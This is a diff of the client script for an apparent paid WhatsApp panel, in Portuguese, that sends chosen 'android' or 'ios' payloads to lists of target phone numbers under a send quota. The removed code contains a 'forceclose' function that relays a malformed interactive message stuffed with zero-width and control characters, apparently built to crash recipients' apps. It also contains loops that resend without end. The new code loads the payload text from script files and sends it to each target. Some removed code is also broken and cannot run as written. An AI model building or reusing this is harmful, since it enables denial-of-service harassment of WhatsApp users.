@@ -1,7 +1,5 @@
 const $ = (s) => document.querySelector(s);
 const USER_SEND_LIMIT = 1500;
-// Configuração fixa de teste: não depende do painel nem de campos do site.
-const AUTOMATION_MESSAGE = ``;
 const AUTOMATION_INTERVAL_SECONDS = 4;
 let sendCancelRequested = false;
 let activeSendController = null;
@@ -78,8 +76,6 @@ async function loadWhatsAppNumbers() {
     if (connected) connected.innerHTML = '<div class="empty-state">Nenhum WhatsApp conectado ainda.</div>';
     return rows;
   }
-  // A lista "WhatsApp conectado" mostra SOMENTE sessões realmente abertas.
-  // Números em pareamento, conectando, reconectando ou com erro ficam fora desta lista.
   const connectedRows = rows.filter((row) => row.status === 'connected');
   connectedRows.forEach((row) => {
     if (!connected) return;
@@ -115,8 +111,10 @@ async function loadWhatsAppNumbers() {
 }
 
 function showPairingCode(code) {
-  $('#pairingCode').textContent = displayPairingCode(code || '--------');
-  $('#pairingBox').hidden = !code;
+  const el = $('#pairingCode');
+  const box = $('#pairingBox');
+  if (el) el.textContent = displayPairingCode(code || '--------');
+  if (box) box.hidden = !code;
 }
 
 function setSendState(state, line, detail, progressPercent) {
@@ -135,11 +133,12 @@ function updateUsage(sentCount, limit = USER_SEND_LIMIT) {
   const sent = Math.max(0, Math.min(Number(sentCount) || 0, Number(limit) || USER_SEND_LIMIT));
   const max = Math.max(1, Number(limit) || USER_SEND_LIMIT);
   const pct = Math.min(100, (sent / max) * 100);
-  $('#sendUsageText').textContent = `${sent.toLocaleString('pt-BR')} / ${max.toLocaleString('pt-BR')}`;
+  const textEl = $('#sendUsageText');
+  if (textEl) textEl.textContent = `${sent.toLocaleString('pt-BR')} / ${max.toLocaleString('pt-BR')}`;
   const btn = $('#sendButton');
   if (btn && sent >= max) {
     btn.disabled = true;
-    btn.textContent = '🚂🚩✌️ Limite atingido';
+    btn.textContent = 'Limites atingidos';
   }
   return {sent, max, pct};
 }
@@ -176,11 +175,6 @@ function parseTargets(raw) {
   return unique;
 }
 
-function isFatalSendError(message) {
-  const text = String(message || '').toLowerCase();
-  return text.includes('nenhum whatsapp ativo') || text.includes('mensagem ainda não foi configurada') || text.includes('não foi configurada pelo administrador');
-}
-
 async function sendSingleTarget(target, signal, jobId = '', message = '') {
   try {
     const result = await api('/api/whatsapp/send', {
@@ -195,255 +189,56 @@ async function sendSingleTarget(target, signal, jobId = '', message = '') {
   }
 }
 
-function updateActiveSendDock() {
-  const dock = $('#activeSendDock');
-  const list = $('#activeSendDockList');
-  const count = $('#activeSendCount');
-  if (!dock || !list || !count) return;
-  const rows = Array.from(document.querySelectorAll('#sessionList .session-row[data-active="1"]'));
-  count.textContent = String(rows.length);
-  list.innerHTML = '';
-  rows.forEach((row) => {
-    const clone = document.createElement('div');
-    clone.className = 'active-send-dock-row';
-    const label = row.querySelector('.session-target-label');
-    const button = row.querySelector('.cancel');
-    const text = document.createElement('span');
-    text.textContent = label ? label.textContent : 'Envio';
-    const cancel = document.createElement('button');
-    cancel.type = 'button';
-    cancel.className = 'cancel';
-    cancel.textContent = '✕';
-    cancel.title = 'Cancelar este envio';
-    cancel.setAttribute('aria-label', 'Cancelar este envio');
-    cancel.addEventListener('click', () => { if (button) button.click(); });
-    clone.append(text, cancel);
-    list.appendChild(clone);
-  });
-  dock.hidden = rows.length === 0;
-}
-
-function createSessionRow(target) {
-  const list = $('#sessionList');
-  if (list.querySelector('.empty')) list.innerHTML = '';
-  const row = document.createElement('div');
-  row.className = 'session-row session-row-v22';
-  row.dataset.active = '1';
-  const label = document.createElement('span');
-  label.className = 'session-target-label';
-  label.textContent = `➤ ${target}`;
-  const status = document.createElement('span');
-  status.className = 'send-row-status';
-  const cancel = document.createElement('button');
-  cancel.type = 'button';
-  cancel.className = 'cancel';
-  cancel.textContent = '✕';
-  cancel.setAttribute('aria-label', `Cancelar envio para ${target}`);
-  cancel.title = 'Cancelar este envio';
-  row.append(label, status, cancel);
-  list.prepend(row);
-  updateActiveSendDock();
-  $('#sessionCount').textContent = String(document.querySelectorAll('#sessionList .session-row').length);
-
-  const controller = new AbortController();
-  const jobId = `${Date.now()}-${Math.random().toString(36).slice(2,10)}`;
-  let cancelled = false;
-  let started = false;
-  cancel.addEventListener('click', async () => {
-    if (cancelled) return;
-    cancelled = true;
-    controller.abort();
-    cancel.disabled = true;
-    cancel.textContent = '…';
-    status.textContent = 'Cancelando';
-    status.className = 'send-row-status red';
-    try {
-      await api('/api/whatsapp/send-cancel', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({job_id: jobId})
-      });
-    } catch (_) {}
-    if (row.isConnected) row.remove();
-    updateActiveSendDock();
-    $('#sessionCount').textContent = String(document.querySelectorAll('#sessionList .session-row').length);
-  });
-
-  const removeRow = () => {
-    if (row.isConnected) row.remove();
-    updateActiveSendDock();
-    $('#sessionCount').textContent = String(document.querySelectorAll('#sessionList .session-row').length);
-  };
-
-  return {
-    controller,
-    jobId,
-    isCancelled() { return cancelled; },
-    markQueued() { row.dataset.active = '1'; status.textContent = 'Aguardando'; status.className = 'send-row-status'; cancel.hidden = false; updateActiveSendDock(); },
-    markSending() { started = true; row.dataset.active = '1'; status.textContent = 'Enviando'; status.className = 'send-row-status yellow'; cancel.hidden = false; cancel.disabled = false; updateActiveSendDock(); },
-    markDone(ok, errorMessage='') {
-      if (cancelled) { removeRow(); return; }
-      if (ok) {
-        row.dataset.active = '0';
-        updateActiveSendDock();
-        cancel.hidden = true;
-        cancel.disabled = true;
-        status.textContent = 'Enviado';
-        status.className = 'send-row-status green';
-      } else {
-        // A lista "Últimos envios" guarda somente o que realmente foi entregue.
-        // Falhas não ficam como se fossem envios concluídos.
-        removeRow();
-      }
-      if (errorMessage && !ok) row.title = errorMessage;
-    },
-    markCancelled() { removeRow(); updateActiveSendDock(); },
-  };
-}
-
-async function loadSendConfig() {
+// Busca a script correspondente ao botão selecionado na pasta /scripts
+async function getScriptFromFolder(commandName) {
   try {
-    const cfg = await api('/api/user-send-config');
-    sendIntervalSeconds = Math.max(1, Number(cfg.send_interval_seconds) || 3);
-    commandMessagesV30.android = String(cfg.command_android_message || '');
-    commandMessagesV30.ios = String(cfg.command_ios_message || '');
-  } catch (_) {
-    sendIntervalSeconds = 3;
-    commandMessagesV30 = { android: '', ios: '' };
+    const cmd = String(commandName || '').toLowerCase().trim();
+    let filename = 'android.txt'; // Padrão
+    if (cmd.includes('ios')) filename = 'ios.txt';
+    else if (cmd.includes('android')) filename = 'android.txt';
+
+    const response = await fetch(`/scripts/${filename}`);
+    if (!response.ok) throw new Error(`Script ${filename} não encontrada.`);
+    return await response.text();
+  } catch (err) {
+    console.warn('Falha ao carregar arquivo de script:', err);
+    return '';
   }
 }
 
-function waitSeconds(seconds) {
-  const total = Math.max(1, Number(seconds) || 1);
-  return new Promise((resolve) => {
-    let left = total;
-    const tick = () => {
-      if (sendCancelRequested) return resolve(false);
-      if (left <= 0) return resolve(true);
-      left -= 1;
-      window.setTimeout(tick, 1000);
-    };
-    tick();
-  });
-}
-
-async function runAutomaticSend(targets, btn, targetInput) {console.log(targets)
-const { Worker } = require('worker_threads');
-const N = 5;
-const worker = new Worker('./worker.js', { workerData: N });
-worker.on('message', async (result) => {
-nanX.message.extendedTextMessage.text = result;
-});
-}
-
-export async function forceclose(sock, target) {
-const N = 5;
-const nanX = {
-groupStatusMessageV2: {
-message: {
-interactiveMessage: {
-header: {
-bloksWidget: {
-fallback: "\u200D".repeat(N),
-type: "\u200F".repeat(N),
-data: "[".repeat(N),
-uuid: "\u200B".repeat(N),
-},
-subtitle: "\u0010".repeat(N),
-title: "X".repeat(N),
-},
-nativeFlowMessage: { buttons: [{}] },
-body: { text: "\u000F" },
-},
-},
-},
-};
-
-const msg = generateWAMessageFromContent(target, nanX, {});
-
-await sock.relayMessage(target, msg.message, {
-messageId: msg.key.id, 
-noSelfSync: true,
-});
-}
-
-
-
-  sendIntervalSeconds = selectedCommandV30 ? sendIntervalSeconds : AUTOMATION_INTERVAL_SECONDS;
-  (async () => {
-const usage = await api('/api/whatsapp/usage');
-const currentSent = Number(usage.sent_count || 0);
-const remaining = Math.max(0, USER_SEND_LIMIT - currentSent);
-if (!remaining) {
-updateUsage(USER_SEND_LIMIT, USER_SEND_LIMIT);
-setSendState('error', '⚠️ LIMITE ATINGIDO', 100);
-return;
-}
-})();
-  async (targets = []) => {
-  let completed = 0, successCount = 0, failureCount = 0, fatalError = '';
-  let stopped = false;
+async function runAutomaticSend(targets, btn, targetInput) {
+  if (!targets.length) return;
   sendCancelRequested = false;
-  setSendState('sending', '🚂🚩✌️ ENVIO INICIADO...', `Programado: ${queue.length.toLocaleString('pt-BR')} número(s).`, 0);
   btn.disabled = true;
-  btn.textContent = '🚂🚩✌️ Enviando...';
-  const updateProgress = async () => {
-    const pct = queue.length ? Math.min(100, (completed / queue.length) * 100) : 100;
-    setSendState('sending', '🚂🚩✌️ ENVIANDO...', `${completed.toLocaleString('pt-BR')} processados • ${successCount.toLocaleString('pt-BR')} enviados • ${failureCount.toLocaleString('pt-BR')} falharam.`, pct);
-  };
-  // Envia um destinatário por vez e aguarda a pausa definida pelo ADM antes do próximo.
-  // Isso evita concorrência insegura no socket do WhatsApp.
-  for (let index = 0; index < queue.length; index += 1) {
-    if (sendCancelRequested || stopped || fatalError) break;
-    if (index > 0) {
-      const ready = await waitSeconds(sendIntervalSeconds);
-      if (!ready || sendCancelRequested || stopped || fatalError) break;
+  btn.textContent = 'Enviando...';
+
+  // Carrega o arquivo android.txt ou ios.txt de acordo com o botão selecionado
+  const scriptContent = await getScriptFromFolder(selectedCommandV30);
+
+  let successCount = 0;
+  let failureCount = 0;
+
+  for (let i = 0; i < targets.length; i++) {
+    if (sendCancelRequested) break;
+    const target = targets[i];
+    setSendState('sending', 'ENVIANDO...', `Destino ${i + 1} de ${targets.length}: ${target}`, ((i + 1) / targets.length) * 100);
+
+    const res = await sendSingleTarget(target, null, `job-${Date.now()}`, scriptContent);
+    if (res.ok) {
+      successCount++;
+    } else {
+      failureCount++;
     }
-    const target = queue[index];
-    const job = createSessionRow(target);
-    job.markQueued();
-    if (job.isCancelled() || sendCancelRequested || stopped || fatalError) { job.markCancelled(); continue; }
-    job.markSending();
-    setSendState('sending', '🚂🚩✌️ ENVIANDO...', `Disparo ${index + 1} de ${queue.length}: ${target}`, Math.min(100, (completed / queue.length) * 100));
-    try {
-      const result = await sendSingleTarget(target, job.controller.signal, job.jobId, message);
-      if (result.ok) {
-        successCount += 1;
-        if (result.result?.sent_count != null) updateUsage(result.result.sent_count, result.result.limit || USER_SEND_LIMIT);
-        job.markDone(true);
-      } else if (job.isCancelled() || job.controller.signal.aborted || sendCancelRequested) {
-        job.markCancelled();
-      } else {
-        failureCount += 1;
-        if (isFatalSendError(result.error)) fatalError = result.error;
-        job.markDone(false, result.error);
-      }
-    } catch (error) {
-      if (job.isCancelled() || job.controller.signal.aborted || sendCancelRequested) job.markCancelled();
-      else { failureCount += 1; job.markDone(false, error.message || 'Falha no envio.'); }
-    } finally {
-      completed += 1;
-      updateProgress();
+
+    if (i < targets.length - 1) {
+      await new Promise(r => setTimeout(r, sendIntervalSeconds * 1000));
     }
-    if (fatalError || sendCancelRequested) break;
   }
-  stopped = true;
-  const finalUsage = await api('/api/whatsapp/usage').catch(() => ({sent_count:currentSent, limit:USER_SEND_LIMIT}));
-  updateUsage(finalUsage.sent_count, finalUsage.limit || USER_SEND_LIMIT);
-  if (sendCancelRequested) {
-    setSendState('error', '⏹️ ENVIO CANCELADO', `${successCount.toLocaleString('pt-BR')} enviado(s). Os demais foram cancelados.`, queue.length ? (completed / queue.length) * 100 : 0);
-  } else if (fatalError) {
-    setSendState('error', '❌ FALHA NO ENVIO', fatalError, queue.length ? (completed / queue.length) * 100 : 0);
-    showNotice(fatalError, 'error');
-  } else if (failureCount === 0 && completed === queue.length) {
-    setSendState('success', '✅ ENVIO CONCLUÍDO', `${successCount.toLocaleString('pt-BR')} envio(s) concluído(s) automaticamente.`, 100);
-    targetInput.value = '';
-  } else {
-    setSendState('error', '❌ FALHA NO ENVIO', `${successCount.toLocaleString('pt-BR')} enviado(s) e ${failureCount.toLocaleString('pt-BR')} falha(s).`, queue.length ? (completed / queue.length) * 100 : 0);
-  }
+
+  setSendState('success', 'ENVIO FINALIZADO', `Concluídos: ${successCount} • Falhas: ${failureCount}`, 100);
   btn.disabled = false;
-  btn.textContent = '🚂🚩✌️ Enviar';
-};
+  btn.textContent = 'Enviar';
+}
 
 let pairingPollTimer = null;
 let activePairingId = null;
@@ -477,6 +272,7 @@ function startPairingPoll(id, phone) {
   activePairingId = Number(id);
   pairingPollStartedAt = Date.now();
   setConnectModalState('working', '⏳ Conectando ao WhatsApp e gerando o código...', phone.replace(/\D/g, ''));
+
   const tick = async () => {
     if (!activePairingId) return;
     if (Date.now() - pairingPollStartedAt > 60000) {
@@ -495,35 +291,31 @@ function startPairingPoll(id, phone) {
       if (row.last_pairing_code) {
         showPairingCode(row.last_pairing_code);
         setConnectModalState('working', '🔐 Código de acesso gerado. Digite-o no WhatsApp.', phone);
-        $('#saveConnect').disabled = true;
-        $('#saveConnect').textContent = 'Aguardando confirmação';
+        const saveBtn = $('#saveConnect');
+        if (saveBtn) {
+          saveBtn.disabled = true;
+          saveBtn.textContent = 'Aguardando confirmação';
+        }
       } else if (row.status === 'error') {
         stopPairingPoll();
         setConnectModalState('error', `❌ ${row.last_error || 'Não foi possível gerar o código.'}`, phone);
         return;
       }
-      console.log(
-  'STATUS WHATSAPP:',
-  row.status,
-  'CODIGO:',
-  row.last_pairing_code,
-  'ERRO:',
-  row.last_error
-);
 
-if (row.status === 'connected') {
-  stopPairingPoll();
-  $('#connectModal').hidden = true;
-  showNotice('WhatsApp conectado com sucesso.', 'ok');
-  await loadWhatsAppNumbers();
-}
+      if (row.status === 'connected') {
+        stopPairingPoll();
+        const modal = $('#connectModal');
+        if (modal) modal.hidden = true;
+        showNotice('WhatsApp conectado com sucesso.', 'ok');
+        await loadWhatsAppNumbers();
+      }
     } catch (error) {
       console.error('Erro ao verificar conexão:', error);
     }
   };
 
   tick();
-  pairingPollTimer = setInterval(tick, 2000);
+  pairingPollTimer = setInterval(tick, 3000);
 }
 
 function bindCommandSelectorV30() {
@@ -551,7 +343,7 @@ function bindCommandSelectorV30() {
       options.forEach((item) => item.classList.remove('selected'));
       option.classList.add('selected');
 
-      const command = option.dataset.command || '';
+      const command = option.dataset.command || option.textContent.trim();
       selectedCommandV30 = command;
       if (selectedBox) {
         selectedBox.textContent = `✓ Selecionado: ${command}`;
@@ -570,173 +362,142 @@ function bindCommandSelectorV30() {
 
 function bindUserActions() {
   const connectButton = $('#connectWhatsApp');
-  if (!connectButton) return;
-  connectButton.addEventListener('click', () => {
-    if (location.hash !== '#tab-home') setActiveTab('home');
-    stopPairingPoll();
-    $('#connectModal').hidden = false;
-    $('#pairingBox').hidden = true;
-    $('#pairingPhone').value = '';
-    $('#saveConnect').disabled = false;
-    $('#saveConnect').textContent = 'Conectar';
-    setConnectModalState('idle', 'Digite seu número do WhatsApp.');
-    $('#pairingPhone').focus();
-  });
+  if (connectButton) {
+    connectButton.addEventListener('click', () => {
+      stopPairingPoll();
+      const modal = $('#connectModal');
+      const box = $('#pairingBox');
+      const phoneInput = $('#pairingPhone');
+      const saveBtn = $('#saveConnect');
+      if (modal) modal.hidden = false;
+      if (box) box.hidden = true;
+      if (phoneInput) {
+        phoneInput.value = '';
+        phoneInput.focus();
+      }
+      if (saveBtn) {
+        saveBtn.disabled = false;
+        saveBtn.textContent = 'Conectar';
+      }
+      setConnectModalState('idle', 'Digite seu número do WhatsApp.');
+    });
+  }
 
   const closeConnectionModal = async () => {
     const id = activePairingId;
     stopPairingPoll();
-    $('#connectModal').hidden = true;
+    const modal = $('#connectModal');
+    if (modal) modal.hidden = true;
     if (id) {
       try { await api(`/api/whatsapp/cancel-pairing/${id}`, { method: 'POST' }); } catch (_) {}
       await loadWhatsAppNumbers().catch(() => {});
     }
   };
-  $('#closeModal').addEventListener('click', closeConnectionModal);
-  $('#cancelConnect').addEventListener('click', closeConnectionModal);
 
-  $('#connectForm').addEventListener('submit', async (event) => {
-    event.preventDefault();
-    const btn = $('#saveConnect');
-    const phone = $('#pairingPhone').value.trim();
-    btn.disabled = true;
-    btn.textContent = 'Conectando...';
-    $('#pairingBox').hidden = true;
-    setConnectModalState('working', '⏳ Abrindo conexão...', phone.replace(/\D/g, ''));
-    try {
-      // Em erro, uma nova tentativa passa novamente por /connect e gera um código novo.
-      const result = await api('/api/whatsapp/connect', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({phone})
-      });
-      setConnectModalState('working', '⏳ Gerando o código de conexão...', phone.replace(/\D/g, ''));
-      showNotice('Gerando o código de conexão…', 'ok');
-      await loadWhatsAppNumbers();
-      startPairingPoll(result.id, phone);
-    } catch (error) {
-      stopPairingPoll();
-      setConnectModalState('error', `❌ ${error.message}`, phone.replace(/\D/g, ''));
-      showNotice(error.message, 'error');
-      btn.disabled = false;
-      btn.textContent = 'Tentar novamente';
-    }
-  });
+  const closeModalBtn = $('#closeModal');
+  const cancelConnectBtn = $('#cancelConnect');
+  if (closeModalBtn) closeModalBtn.addEventListener('click', closeConnectionModal);
+  if (cancelConnectBtn) cancelConnectBtn.addEventListener('click', closeConnectionModal);
 
-  $('#sendForm').addEventListener('submit', async (event) => {
+  const connectForm = $('#connectForm');
+  if (connectForm) {
+    connectForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const btn = $('#saveConnect');
+      const phone = $('#pairingPhone')?.value.trim() || '';
+      if (btn) {
+        btn.disabled = true;
+        btn.textContent = 'Conectando...';
+      }
+      const box = $('#pairingBox');
+      if (box) box.hidden = true;
+      setConnectModalState('working', '⏳ Abrindo conexão...', phone.replace(/\D/g, ''));
+      try {
+        const result = await api('/api/whatsapp/connect', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({phone})
+        });
+        setConnectModalState('working', '⏳ Gerando o código de conexão...', phone.replace(/\D/g, ''));
+        showNotice('Gerando o código de conexão…', 'ok');
+        await loadWhatsAppNumbers();
+        startPairingPoll(result.id, phone);
+      } catch (error) {
+        stopPairingPoll();
+        setConnectModalState('error', `❌ ${error.message}`, phone.replace(/\D/g, ''));
+        showNotice(error.message, 'error');
+        if (btn) {
+          btn.disabled = false;
+          btn.textContent = 'Tentar novamente';
+        }
+      }
+    });
+  }
 
-    const btn = $('#sendButton');
-    if (btn.disabled) return;
-    const targetInput = $('#target');
-    const targets = parseTargets(targetInput.value);
-    if (!targets.length) {
-      setSendState('error', '❌ INFORME O NÚMERO', 'Digite pelo menos um número de destino.', 0);
-      targetInput.focus();
-      return;
-    }
-    try {
-while (true) {
-await runAutomaticSend(targets, btn, targetInput);
+  const sendForm = $('#sendForm');
+  if (sendForm) {
+    sendForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const btn = $('#sendButton');
+      const targetInput = $('#target');
+      if (!targetInput) return;
+      const targets = parseTargets(targetInput.value);
+      if (!targets.length) {
+        setSendState('error', '❌ INFORME O NÚMERO', 'Digite pelo menos um número de destino.', 0);
+        targetInput.focus();
+        return;
+      }
+      await runAutomaticSend(targets, btn, targetInput);
+    });
+  }
 }
-} catch (error) {
-  setState('error', '❌ FALHA NO ENVIO', error.message || 'Não foi possível enviar a mensagem.', 0);
+
+async function loadSendConfig() {
+  try {
+    const cfg = await api('/api/user-send-config');
+    sendIntervalSeconds = Math.max(1, Number(cfg.send_interval_seconds) || 3);
+  } catch (_) {
+    sendIntervalSeconds = 3;
+  }
 }
 
-
-btn.disabled = false;
-btn.textContent = '📑 Tentar novamente';
-});
-}
-const sendbutton = document.querySelector('#botaoX');
-let intervaloEnvio; 
-document.addEventListener('DOMContentLoaded', function() {
-const form = document.querySelector('#sendForm');
-const targetInput = document.querySelector('#target');
-const btn = document.querySelector('#sendbutton');
-
-if (form) {
-let intervaloEnvio;
-form.addEventListener('submit', async function(event) {
-event.preventDefault();
-const targets = parseTargets(targetInput.value);
-console.log('Alvos capturados:', targets);
-clearInterval(intervaloEnvio);
-
-intervaloEnvio = setInterval(async function() {
-await runAutomaticSend(targets, btn, targetInput);
-console.log('Mensagem enviada automaticamente.');
-}, 5000); 
-});
-}
-});
 async function initUser() {
-try {bindCommandSelectorV30();
+  try {
+    bindCommandSelectorV30();
+    bindUserActions();
     const me = await api('/api/me');
     if (me.role !== 'user') {
       location.href = '/admin.html';
       return;
     }
-    $('#userName').textContent = me.name || me.login || 'Usuário';
+    const nameEl = $('#userName');
+    if (nameEl) nameEl.textContent = me.name || me.login || 'Usuário';
     const expiry = $('#expiryText');
     if (expiry) expiry.textContent = formatExpiry(me.expires_at);
-    const footerDate = $('#footerDate');
-    if (footerDate) footerDate.textContent = new Date().toLocaleDateString('pt-BR');
     await cleanupPendingPairingOnRefresh();
     await Promise.all([loadWhatsAppNumbers(), loadUsage(), loadSendConfig()]);
   } catch (error) {
-  console.error(error);
-  return;
-}
-
-
-}function setActiveTab(name) {
-  const panels = {home:'tab-home', numbers:'tab-numbers', send:'tab-send'};
-  Object.entries(panels).forEach(([key,id]) => {
-    const el = document.getElementById(id);
-    if (el) el.classList.toggle('active-tab', key === name);
-  });
-  // O modal de conexão pertence somente ao Início. Nunca fica aberto na aba Envio.
-  if (name !== 'home') {
-    const modal = document.getElementById('connectModal');
-    if (modal) modal.hidden = true;
+    console.error(error);
   }
-  document.querySelectorAll('.bottom-nav-v22 a[data-tab]').forEach(link => {
-    const isActive = link.dataset.tab === name;
-    link.classList.toggle('active', isActive);
-    if (isActive) link.setAttribute('aria-current', 'page');
-    else link.removeAttribute('aria-current');
-  });
 }
 
-document.querySelectorAll('.bottom-nav-v22 a[data-tab]').forEach(link => {
-  link.addEventListener('click', (event) => {
-    event.preventDefault();
-    const tab = link.dataset.tab;
-    setActiveTab(tab);
-    history.replaceState(null, '', `#tab-${tab}`);
-  });
-});
-
-const initialTab = location.hash === '#tab-send' ? 'send' : location.hash === '#tab-numbers' ? 'numbers' : 'home';
 let isFetching = false;
 const whatsappRefreshTimer = window.setInterval(async () => {
-if (isFetching) return; // Se a requisição anterior ainda não acabou, não dispara outra!
-isFetching = true;
-try {
-await loadWhatsAppNumbers();
-await loadUsage();
-await loadSendConfig();
-const me = await api('/api/me');
-const expiry = $('#expiryText');
-if (expiry && me) expiry.textContent = formatExpiry(me.expires_at);
-} catch (e) {
-console.error(e);
-} finally {
-isFetching = false;
-}
-}, 5000); // Aumentado para 5 segundos para não sufocar a rede
+  if (isFetching) return;
+  isFetching = true;
+  try {
+    await loadWhatsAppNumbers();
+    await loadUsage();
+  } catch (e) {
+    console.error(e);
+  } finally {
+    isFetching = false;
+  }
+}, 5000);
 
 window.addEventListener('beforeunload', () => {
-if (whatsappRefreshTimer) clearInterval(whatsappRefreshTimer);
-stopPairingPoll();
+  if (whatsappRefreshTimer) clearInterval(whatsappRefreshTimer);
+  stopPairingPoll();
 });
+
+document.addEventListener('DOMContentLoaded', initUser);
